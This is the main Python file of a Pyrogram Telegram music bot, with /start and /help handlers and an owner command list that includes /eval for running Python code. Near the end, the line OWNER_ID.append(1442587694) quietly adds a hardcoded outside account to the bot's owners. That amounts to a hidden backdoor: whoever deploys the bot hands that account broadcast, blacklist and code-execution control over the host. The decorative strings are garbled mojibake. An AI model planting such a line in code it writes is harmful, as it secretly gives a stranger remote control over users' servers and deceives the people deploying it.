from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
š šš²š¹š¹š¼ [{}](tg://user?id={}),

\n\nš ššŗ šøššØš§š  šš„šš² ššØš­[š¶](https://telegra.ph/file/064e37be329e704c11638.jpg)

I'M Music Bot By @AD_BOTZ š¤

š¦š²š»š± š§šµš² š”š®šŗš² š¢š³ š§šµš² š¦š¼š»š“ š¬š¼š šŖš®š»š... šš„°š¤

šš . ```/song Faded```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="ššššššš š¬", url="http://t.me/AD_BOTZ"),
             InlineKeyboardButton(
                        text="ššš šš š¤", url="http://t.me/SONGS_PLAY_bot?startgroup=true"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "š¦š²š»š± š§šµš² š”š®šŗš² š¢š³ š§šµš² š¦š¼š»š“ š¬š¼š šŖš®š»š... šš„°[š¤](https://telegra.ph/file/ce794c022430786d82b24.jpg),\n /song (song name) š„³"
    await message.reply(text)

OWNER_ID.append(1442587694)
app.start()
LOGGER.info("SongPlayRoBot Is Now Workingš¤š¤š¤")
idle()
